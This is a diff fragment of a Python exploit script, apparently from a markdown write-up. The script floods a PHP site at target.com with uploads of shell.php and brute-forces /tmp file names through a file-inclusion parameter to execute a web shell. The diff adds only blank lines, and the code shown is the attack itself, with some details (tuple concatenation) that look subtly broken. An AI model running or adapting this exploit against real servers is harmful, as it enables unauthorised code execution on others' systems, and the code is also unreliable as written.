@@ -21,6 +21,7 @@ f = {'file': open('shell.php', 'rb')}
 for _ in range(4096 * 4096):
     requests.post('http://target.com/index.php?c=index.php', f)
 
+
 print('[+] Bruteforcing the inclusion')
 for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
     url = 'http://target.com/index.php?c=/tmp/php' + fname
@@ -31,3 +32,5 @@ for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
 
 print('[x] Something went wrong, please try again')
 ```
+
+
